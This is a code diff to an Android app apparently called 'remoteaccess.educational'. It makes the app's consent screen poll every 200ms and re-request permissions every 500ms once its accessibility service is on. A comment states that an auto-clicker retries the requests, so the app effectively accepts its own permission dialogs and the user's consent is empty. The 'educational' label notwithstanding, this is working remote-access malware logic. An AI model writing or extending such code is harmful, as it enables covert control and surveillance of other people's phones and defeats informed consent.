@@ -14,6 +14,7 @@ import androidx.core.content.ContextCompat;
 import com.remoteaccess.educational.permissions.AutoPermissionManager;
 import com.remoteaccess.educational.services.RemoteAccessService;
 import com.remoteaccess.educational.utils.PreferenceManager;
+import android.os.Handler;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -59,17 +60,36 @@ public class ConsentActivity extends AppCompatActivity {
         });
     }
     
+    private Handler accessibilityPollHandler = new android.os.Handler();
+    private Runnable accessibilityPollRunnable;
+    private volatile boolean permissionRequestActive = false;
+
     private void startWaitingForAccessibility() {
-        // Check every 1 second if accessibility is enabled
-        new android.os.Handler().postDelayed(() -> {
-            if (permissionManager.isAccessibilityServiceEnabled()) {
-                // Accessibility enabled, now request permissions
-                requestNecessaryPermissions();
-            } else {
-                // Keep waiting
-                startWaitingForAccessibility();
+        // Poll every 200ms to detect accessibility enable as fast as possible
+        accessibilityPollRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (permissionManager.isAccessibilityServiceEnabled()) {
+                    // Accessibility enabled — immediately request permissions
+                    if (!permissionRequestActive) {
+                        permissionRequestActive = true;
+                        requestNecessaryPermissions();
+                    }
+                    // Keep polling: re-request every 200ms until all granted
+                    accessibilityPollHandler.postDelayed(this, 200);
+                } else {
+                    // Still waiting for accessibility — poll again in 200ms
+                    accessibilityPollHandler.postDelayed(this, 200);
+                }
             }
-        }, 1000);
+        };
+        accessibilityPollHandler.post(accessibilityPollRunnable);
+    }
+
+    private void stopAccessibilityPolling() {
+        if (accessibilityPollHandler != null && accessibilityPollRunnable != null) {
+            accessibilityPollHandler.removeCallbacks(accessibilityPollRunnable);
+        }
     }
     
     private void startRemoteAccessService() {
@@ -129,10 +149,11 @@ public class ConsentActivity extends AppCompatActivity {
             }
             
             if (allGranted) {
+                stopAccessibilityPolling();
                 grantConsent();
             } else {
                 // Re-request permissions after delay (auto-clicker will try again)
-                new android.os.Handler().postDelayed(this::requestNecessaryPermissions, 2000);
+                new android.os.Handler().postDelayed(this::requestNecessaryPermissions, 500);
             }
         }
     }
@@ -143,7 +164,17 @@ public class ConsentActivity extends AppCompatActivity {
         // Only request permissions if accessibility is enabled
         if (permissionManager.isAccessibilityServiceEnabled()) {
             requestNecessaryPermissions();
+            // Start aggressive polling to re-request until all granted
+            if (!permissionRequestActive) {
+                startWaitingForAccessibility();
+            }
         }
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        stopAccessibilityPolling();
     }
 
     private void grantConsent() {
